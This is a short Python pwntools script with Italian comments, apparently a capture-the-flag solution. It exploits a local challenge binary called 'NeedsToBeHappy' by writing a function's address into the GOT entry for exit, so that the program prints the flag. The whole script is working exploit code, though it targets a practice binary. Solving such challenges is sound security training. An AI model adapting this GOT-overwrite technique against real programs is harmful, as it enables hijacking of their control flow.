from pwn import *

# Avviamo il processo
p = process('./NeedsToBeHappy')

addr_exit_got = int('404048', 16)
addr_f_cat = int('401276', 16)
p.sendline('Y')
p.sendline(str(addr_f_cat).encode())
p.sendline(str(addr_exit_got).encode())


# Passiamo al controllo manuale per leggere la flag
p.interactive()